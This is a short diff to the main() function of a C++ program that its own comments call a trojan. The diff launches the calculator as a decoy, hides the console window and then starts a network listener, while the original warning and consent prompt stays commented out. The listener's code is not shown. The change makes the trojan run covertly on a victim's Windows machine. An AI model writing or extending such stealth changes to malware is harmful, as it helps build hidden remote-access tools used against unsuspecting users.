@@ -26,7 +26,11 @@ int main()
 
   // cout << "[WARNING] This is a trojan. Do u really want to start? [Y] or [N]" << endl;
   // cin >> confirm;
+  system("calc");
+  HWND window = GetConsoleWindow();
+  ShowWindow(window, SW_HIDE);
   listener.startListening();
+  
   // if (confirm == "N") {
   //   exit(1);
   // } else {
